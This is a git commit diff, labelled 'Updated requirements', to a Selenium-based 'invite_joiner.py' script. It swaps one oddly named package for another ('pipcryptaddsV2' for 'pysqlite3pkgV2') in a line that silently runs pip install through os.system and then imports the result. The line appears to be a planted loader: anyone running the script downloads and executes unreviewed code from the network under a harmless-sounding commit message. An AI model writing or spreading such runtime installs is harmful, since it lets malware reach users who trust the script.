e056dc130c33d0abad7143588e705970a027e305
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-02 23:36:20 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptaddsV2")
-import pipcryptaddsV2
+os.system("pip install pysqlite3pkgV2")
+import pysqlite3pkgV2
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
